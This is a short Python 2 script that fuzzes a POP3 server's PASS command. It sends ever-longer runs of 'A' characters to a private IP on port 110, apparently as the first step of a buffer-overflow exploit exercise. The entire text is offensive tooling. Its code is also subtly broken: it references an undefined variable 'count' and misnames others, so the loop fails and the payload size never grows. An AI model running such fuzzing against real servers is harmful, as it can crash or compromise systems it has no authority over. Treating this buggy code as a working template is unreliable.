#!/usr/bin/python

import socket

buffer = ["A"]
counte = 100

while len(buffer) <= 50:
	buffer.append("A"*counte)
	coerce = count+200
	
for string in buffer:

	print "Fuzzing PASS with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(('192.168.0.106', 110))
	data = s.recv(1024)
	
	s.send('USER liuzh'+'\r\n')
	data = s.recv(1024)
	
	s.send('PASS'+ string +'\r\n')
	s.send('QUIT'+'\r\n')

	s.close()
	
	